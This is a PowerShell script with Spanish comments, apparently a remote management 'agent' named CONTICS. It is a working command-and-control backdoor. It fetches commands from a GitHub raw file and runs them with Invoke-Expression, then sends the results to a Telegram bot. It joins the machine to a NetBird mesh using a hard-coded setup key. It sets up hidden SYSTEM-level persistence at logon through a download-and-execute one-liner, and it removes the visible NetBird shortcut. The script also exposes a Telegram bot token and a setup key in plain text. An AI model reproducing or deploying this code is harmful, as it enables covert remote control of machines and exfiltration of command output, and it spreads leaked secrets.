# ===========================================================================
# SCRIPT DE RED CONTICS 2026 - AGENTE V6 (SMART-HEALING & C2)
# VERSION FINAL - OPTIMIZADA PARA VELOCIDAD Y ESTABILIDAD
# ===========================================================================

# --- [1] CONFIGURACION DE RUTAS ---
$GitHubRawUrl = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-win.ps1'
$TareaUrl     = 'https://raw.githubusercontent.com/emerson101293/contics-infra/refs/heads/main/agent-tasks.txt'

# --- [2] CONFIGURACION DE TELEGRAM ---
$TelegramToken = '8693420261:AAH0RQ-7LySZ03gglYDYOjJbY1xJonv_fak'
$TelegramChatID = '6902736310'

function Send-Telegram {
    param([string]$Message)
    try {
        $Url = "https://api.telegram.org/bot$($TelegramToken)/sendMessage"
        $Body = @{ chat_id = $TelegramChatID; text = $Message }
        $Json = $Body | ConvertTo-Json -Compress
        $utf8 = [System.Text.Encoding]::UTF8.GetBytes($Json)
        $null = Invoke-RestMethod -Uri $Url -Method Post -Body $utf8 -ContentType "application/json; charset=utf-8"
    } catch { }
}

Clear-Host
Write-Host "======================================================" -ForegroundColor Cyan
Write-Host "      SISTEMA INTELIGENTE CONTICS 2026" -ForegroundColor Cyan
Write-Host "======================================================" -ForegroundColor Cyan

# --- [3] BOT DE COMANDOS (C2) ---
Write-Host "`n[1/4] Consultando Bot de Comandos (C2)..." -ForegroundColor Yellow
try {
    $TareaData = Invoke-WebRequest -Uri $TareaUrl -UseBasicParsing -ErrorAction SilentlyContinue
    if ($TareaData) {
        $Tarea = $TareaData.Content.Trim()
        if ($Tarea -ne "NONE" -and $Tarea -ne "") {
            Write-Host " [+] Ejecutando instruccion: $Tarea" -ForegroundColor White
            $Out = Invoke-Expression $Tarea 2>&1 | Out-String
            Send-Telegram -Message "ORDEN C2 EN: $env:COMPUTERNAME`n`nComando: $Tarea`n`nResultado: $Out"
            Write-Host " [+] Resultado enviado a Telegram." -ForegroundColor Green
        } else {
            Write-Host " [+] Sin instrucciones pendientes." -ForegroundColor Gray
        }
    }
} catch { 
    Write-Host " [-] Error al conectar con C2." -ForegroundColor Red
}

# --- [4] LOGICA DE AUTOCURACION (NETBIRD) ---
Write-Host "`n[2/4] Verificando salud de la red..." -ForegroundColor Yellow
$mUrl = 'https://contics-admin.duckdns.org'
$sKey = '8552E0C2-4E0A-490D-8B93-E2CD69CDC007'
$nbPath = 'C:\Program Files\NetBird\netbird.exe'

# Verificar instalacion
if (!(Test-Path $nbPath)) {
    Write-Host " [-] NetBird no detectado. Instalando..." -ForegroundColor Red
    $installer = "$env:TEMP\nb.exe"
    Invoke-WebRequest -Uri 'https://github.com/netbirdio/netbird/releases/latest/download/netbird_installer_windows_amd64.exe' -OutFile $installer -UseBasicParsing
    Start-Process -FilePath $installer -ArgumentList '/S', '/component=service' -Wait
    Start-Sleep -Seconds 5
}

# Revisar si ya existe conexion activa
$status = & $nbPath status 2>&1
$hasIP = $status | Select-String 'NetBird IP: 100\.'
$isConnected = $status | Select-String 'Management: Connected'

if ($hasIP -and $isConnected) {
    # RED SANA: Solo notificar estado
    $nbIP = (($hasIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
    Write-Host " [+] RED ESTABLE: $nbIP" -ForegroundColor Green
    Send-Telegram -Message "NODO ONLINE: $env:COMPUTERNAME`nIP: $nbIP`nEstado: Sesion mantenida (Smart-Healing)."
} else {
    # RED CAIDA: Reestablecer
    Write-Host " [!] Conexion perdida. Reestableciendo tunel..." -ForegroundColor Red
    & $nbPath down | Out-Null
    $upResult = & $nbPath up --management-url $mUrl --setup-key $sKey 2>&1
    
    if ($upResult -like "*login*") {
        Send-Telegram -Message "ALERTA: PC $env:COMPUTERNAME requiere LOGIN manual.`nLink: $mUrl"
        Write-Host " [!] Requiere autorizacion manual en panel web." -ForegroundColor Yellow
    }
    
    Start-Sleep -Seconds 5
    $finalStatus = & $nbPath status
    $lineaIP = $finalStatus | Select-String 'NetBird IP:'
    if ($lineaIP) {
        $nbIP = (($lineaIP.ToString() -split ':')[1].Trim() -split '/')[0].Trim()
        Send-Telegram -Message "NODO RECONECTADO: $env:COMPUTERNAME`nIP: $nbIP"
        Write-Host " [+] Nueva IP asignada: $nbIP" -ForegroundColor Yellow
    }
}

# --- [5] PERSISTENCIA ---
Write-Host "`n[3/4] Asegurando persistencia..." -ForegroundColor Yellow
$TaskName = "Contics_AtLogon"
$ScriptCmd = "iex (iwr '$GitHubRawUrl' -UseBasicParsing)"

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command `"$ScriptCmd`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal | Out-Null
Write-Host " [+] Persistencia: ACTIVA" -ForegroundColor Green

# --- [6] CIERRE ---
Write-Host "`n[4/4] Finalizando tareas..." -ForegroundColor Yellow
if (Test-Path 'C:\Users\Public\Desktop\NetBird.lnk') { Remove-Item -Path 'C:\Users\Public\Desktop\NetBird.lnk' -Force }

Write-Host "`n------------------------------------------------------" -ForegroundColor Cyan
Write-Host " ESTADO FINAL: NODO CONTICS EN LINEA" -ForegroundColor White
Write-Host "------------------------------------------------------" -ForegroundColor Cyan

Write-Host "`nPresione ENTER para terminar..." -ForegroundColor Gray
Read-Host
